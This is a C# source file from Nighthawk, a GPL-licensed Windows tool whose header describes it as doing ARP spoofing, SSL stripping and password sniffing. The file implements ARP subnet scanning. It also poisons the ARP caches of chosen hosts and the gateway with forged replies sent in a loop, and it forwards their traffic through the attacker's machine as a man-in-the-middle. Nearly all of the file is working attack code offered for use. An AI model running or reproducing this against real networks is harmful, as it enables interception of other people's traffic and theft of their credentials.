using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Net;
using System.Threading;
using SharpPcap;
using PacketDotNet;

/**
Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2010  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    /* ARP network scan & ARP spoofing */
    public class ARPTools
    {
        // current device
        private LivePcapDevice device;

        // status
        public bool ScanStarted = false;
        public bool ResolveHostnames = false;

        public bool SpoofingStarted = false;

        // packet queues (packet store for BG thread to work on)
        public List<ARPPacket> PacketQueue = new List<ARPPacket>();
        private List<ARPPacket> threadQueue = new List<ARPPacket>();

        public List<Packet> PacketRoutingQueue = new List<Packet>();
        private List<Packet> threadRoutingQueue = new List<Packet>();

        // spoofing data
        public List<ARPTarget> SpoofingTargets1;
        public Dictionary<string, PhysicalAddress> IPtoMACTargets1;
        public ARPTarget SpoofingTarget2;

        // worker thread
        private Thread worker;
        private Thread workerSender;
        private Thread workerRouter;

        private DeviceInfo deviceInfo;

        // ARP response event
        public event ArpResponseEventHandler OnArpResponse;

        private void Response(IPAddress ip, PhysicalAddress mac, string hostname)
        {
            if (OnArpResponse != null) OnArpResponse(ip, mac, hostname);
        }

        // ARP scan completed event
        public event ArpScanEventHandler OnArpScanComplete;

        private void ScanCompleted()
        {
            if (OnArpScanComplete != null) OnArpScanComplete();
        }

        // Hostname resolved event
        public event HostnameResolvedHandler HostnameResolved;

        private void Resolved(IPAddress ip, string hostname)
        {
            if (HostnameResolved != null) HostnameResolved(ip, hostname);
        }


        // constructor
        public ARPTools(LivePcapDevice device)
        {
            // store our network interface
            this.device = device;
        }

        // scans network (ARP requests)
        public void ScanNetwork(DeviceInfo deviceInfo, bool resolveHostnames)
        {
            // get start/end IP
            long[] range = Network.MaskToStartEnd(deviceInfo.IP, deviceInfo.Mask);

            long startIP = range[0];
            long endIP = range[1];
            long currentIP = startIP;

            this.deviceInfo = deviceInfo;

            ResolveHostnames = resolveHostnames;

            worker = new Thread(new ThreadStart(Worker));
            worker.Name = "ARP scan thread";
            worker.Start();

            // start worker to listen for packets
            ScanStarted = true;

            // loop through entire subnet, send ARP packets
            while (currentIP <= endIP)
            {
                // send packet
                device.SendPacket(GenerateARPRequest(Network.LongToIP(currentIP), deviceInfo));

                currentIP++;
            }
            
            // timeout - wait for responses
            Timer waitTimer = new Timer(new TimerCallback(Timer_WaitOver));
            waitTimer.Change(3000, Timeout.Infinite);
        }

        // timer callback
        private void Timer_WaitOver(object o)
        {
            ScanStarted = false;

            // stop thread
            worker.Abort();

            // signal scan end, dispose timer
            ScanCompleted();
            (o as Timer).Dispose();
        }

        // start spoofing
        public void StartSpoofing(List<ARPTarget> targets1, ARPTarget target2)
        {
            // set targets
            SpoofingTargets1 = targets1;
            SpoofingTarget2 = target2;

            // create a new IP - MAC dictionary
            IPtoMACTargets1 = new Dictionary<string, PhysicalAddress>();
            SpoofingTargets1.ForEach(delegate(ARPTarget t) { IPtoMACTargets1.Add(t.IP, t.PMAC); });
            
            // add our own computer to targets - routing
            IPtoMACTargets1.Add(deviceInfo.IP, device.Interface.MacAddress);
            
            // change status
            SpoofingStarted = true;

            // clear packet caches
            PacketQueue.Clear();

            // create ARP sender worker
            workerSender = new Thread(new ThreadStart(WorkerSender));
            workerSender.Name = "ARP sender thread";
            workerSender.Start();

            // create ARP router worker
            workerRouter = new Thread(new ThreadStart(WorkerRouter));
            workerRouter.Name = "Router thread";
            workerRouter.Start();
        }

        // stop spoofing
        public void StopSpoofing()
        {
            SpoofingStarted = false;

            // stop threads & re-ARP
            ReArpTargets();
            workerSender.Abort();
            workerRouter.Abort();
            ReArpTargets();
        }

        // create ARP request packet
        private EthernetPacket GenerateARPRequest(string destinationIP, DeviceInfo deviceInfo)
        {
            // generate ethernet part - layer 1
            var ethernetPacket = new EthernetPacket(device.Interface.MacAddress, PhysicalAddress.Parse("FFFFFFFFFFFF"),
                                                    EthernetPacketType.Arp);

            // arp data - layer 2
            var arpPacket = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("FFFFFFFFFFFF"), IPAddress.Parse(destinationIP), device.Interface.MacAddress,
                                       IPAddress.Parse(deviceInfo.IP));

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        // create ARP replay packet - source MAC to device MAC
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC)
        {
            return GenerateARPReply(senderIP, targetIP, targetMAC, device.Interface.MacAddress);
        }

        // create ARP replay packet
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC, PhysicalAddress sourceMAC)
        {
            // generate ethernet part - layer 1
            var ethernetPacket = new EthernetPacket(device.Interface.MacAddress, targetMAC,
                                                    EthernetPacketType.Arp);

            // arp data - layer 2
            var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), sourceMAC,
                                       IPAddress.Parse(senderIP));

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        // send correct ARP entries back to targets
        private void ReArpTargets()
        {
            foreach (ARPTarget target1 in SpoofingTargets1)
            {
                device.SendPacket(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC, target1.PMAC));
            }

            foreach (ARPTarget target1 in SpoofingTargets1)
            {
                device.SendPacket(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC, SpoofingTarget2.PMAC));
            }
        }

        // worker function that parses ARP packets
        public void Worker()
        {
            // main loop
            while (ScanStarted)
            {
                // copy packets to threadQueue
                lock (PacketQueue)
                {
                    foreach (ARPPacket packet in PacketQueue)
                    {
                        threadQueue.Add(packet);
                    }

                    PacketQueue.Clear();
                }

                if (threadQueue.Count > 0)
                {
                    // loop through packets
                    foreach (ARPPacket packet in threadQueue)
                    {
                        // if ARP response and scanner still active
                        if (packet.Operation == ARPOperation.Response && ScanStarted)
                        {
                            // get IP, MAC
                            var ip = packet.SenderProtocolAddress;
                            var mac = packet.SenderHardwareAddress;
                            var hostname = ResolveHostnames ? "Resolving..." : String.Empty;

                            Response(ip, mac, hostname);
                            
                            // resolve hostname
                            if (ResolveHostnames)
                            {
                                // start resolver thread
                                var resolver = new Thread(new ParameterizedThreadStart(WorkerResolver));
                                resolver.Start(ip);
                            }
                        }
                    }

                    threadQueue.Clear();
                }
                else
                {
                    // some timeout
                    Thread.Sleep(50);
                }
            }

            return;
        }

        // worker function that sends ARP packets
        public void WorkerSender()
        {
            // loop
            while (SpoofingStarted)
            {
                // one way...
                foreach (ARPTarget target1 in SpoofingTargets1)
                {
                    device.SendPacket(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC));
                }

                // ...and another
                foreach (ARPTarget target1 in SpoofingTargets1)
                {
                    device.SendPacket(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC));
                }

                // some timeout
                Thread.Sleep(2000);
            }

            return;
        }

        // worker function for routing packets
        public void WorkerRouter()
        {
            // loop
            while (SpoofingStarted)
            {
                // copy packets to threadRoutingQueue
                lock (PacketRoutingQueue)
                {
                    foreach (Packet packet in PacketRoutingQueue)
                    {
                        threadRoutingQueue.Add(packet);
                    }

                    PacketRoutingQueue.Clear();
                }

                // check for pending packets
                if (threadRoutingQueue.Count > 0)
                {
                    // loop through packets and re-send them
                    foreach (Packet packet in threadRoutingQueue)
                    {
                        if (packet == null) continue;

                        var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));

                        var sourceIP = ip.SourceAddress.ToString();
                        var destinationIP = ip.DestinationAddress.ToString();

                        var ethernetPacket = (packet as EthernetPacket);

                        // incoming packets
                        if (IPtoMACTargets1.ContainsKey(destinationIP) && ethernetPacket.DestinationHwAddress.ToString() != IPtoMACTargets1[destinationIP].ToString())
                        {
                            // set real MAC
                            ethernetPacket.SourceHwAddress = device.Interface.MacAddress;
                            ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];

                            try
                            {
                                device.SendPacket(packet);
                            }
                            catch { }
                        }

                        // outgoing packets
                        if (IPtoMACTargets1.ContainsKey(sourceIP) && ethernetPacket.DestinationHwAddress.ToString() != SpoofingTarget2.PMAC.ToString())
                        {
                            // set real MAC
                            ethernetPacket.SourceHwAddress = device.Interface.MacAddress;
                            ethernetPacket.DestinationHwAddress = SpoofingTarget2.PMAC;

                            try
                            {
                                device.SendPacket(packet);
                            }
                            catch { }
                        }
                    }

                    threadRoutingQueue.Clear();
                }
                else
                {
                    // some timeout
                    Thread.Sleep(50);
                }
            }

            return;
        }

        // worker function for resolving hostnames
        public void WorkerResolver(object data)
        {
            var ip = (data as IPAddress);
            var hostname = "";

            Thread.Sleep(100);

            try
            {
                hostname = Dns.GetHostEntry(ip).HostName;
            }
            catch {}

            // invoke event
            Resolved(ip, hostname);
        }
    }
    
    // ArpResponseReceived event delegate
    public delegate void ArpResponseEventHandler(IPAddress ip, PhysicalAddress mac, string hostname);

    // ArpScanEventHandler event delegate
    public delegate void ArpScanEventHandler();

    // HostnameResolved event delegate
    public delegate void HostnameResolvedHandler(IPAddress ip, string hostname);
}
